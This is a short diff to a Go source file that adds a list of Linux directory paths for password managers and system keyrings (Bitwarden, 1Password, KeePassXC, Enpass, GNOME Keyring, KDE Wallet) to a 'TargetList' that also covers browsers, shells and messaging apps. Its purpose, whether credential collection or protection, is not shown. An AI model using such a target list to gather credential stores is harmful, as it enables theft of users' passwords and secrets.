@@ -73,8 +73,41 @@ var messaging = []string{
 	".var/app/org.telegram.desktop/data/TelegramDesktop/",
 }
 
+var password_manager = []string{
+	// Bitwarden
+	".config/Bitwarden/",
+	".var/app/com.bitwarden.desktop/",
+
+	// 1Password
+	".config/1Password/",
+	".var/app/com.onepassword.OnePassword/",
+
+	// KeePassXC
+	".config/keepassxc/",
+	".var/app/org.keepassxc.KeePassXC/",
+
+	// KeePass2
+	".config/KeePass/",
+
+	// KeepassX
+	".config/keepassx/",
+	".keepassx/",
+
+	// Enpass
+	".config/enpass/",
+	".var/app/in.sinew.Enpass/",
+
+	// GNOME Keyring
+	".local/share/keyrings/",
+
+	// KDE Wallet
+	".kde/share/apps/kwallet/",
+	".config/kwalletmanager/",
+}
+
 var TargetList = [][]string{
 	browsers,
 	shell,
 	messaging,
+	password_manager,
 }
